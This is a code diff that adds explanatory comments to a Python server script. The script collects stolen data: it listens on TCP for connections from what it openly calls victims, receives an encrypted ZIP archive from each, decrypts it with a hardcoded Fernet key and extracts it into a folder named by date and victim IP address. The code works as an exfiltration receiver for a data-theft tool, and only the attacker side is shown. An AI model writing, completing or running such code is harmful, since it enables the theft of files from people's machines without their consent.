@@ -33,29 +33,34 @@ parser.add_argument('port', type=port, nargs=1, help='Specfies server port')
 
 args=parser.parse_args()
 
-
+# Create a TCP server socket with a queue of 5 clients/victims
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((args.ip[0], args.port[0]))
 sock.listen(5)
 
 while True:
+	# Accept victim connection and create buffer to store data
 	victim_sock, addr = sock.accept()
 	zf_data = b''
-	try:
+	try:	
+		# Listen for victim data until socket empty. Copy data into above buffer
 		while True:
         		data = victim_sock.recv(4096)
         		if not data:
         			break
         		zf_data += data
 		
+		# After entire ZIP is retrieve, decrpyt the ZIP using the shared key
 		key = b'rfxRvXZ1FTB8XdCew9-BwGnb65iCiXGGo6TzH67KfZg='
 		fernet = Fernet(key)
 		decrypted_zf = fernet.decrypt(zf_data)
 		
+		# Create a new directory in the current directory in the format "DateTime:Victim_IP"
 		dir_name = str(datetime.datetime.now()) + "_" + addr[0]
 		dir_path = os.path.join('.', dir_name)
 		os.mkdir(dir_path)			
-					
+		
+		# Extract decrypted ZIP to above directory
 		with zipfile.ZipFile(io.BytesIO(decrypted_zf), 'r') as zip_ref:
 			zip_ref.extractall(dir_path)
 	except Exception as e:
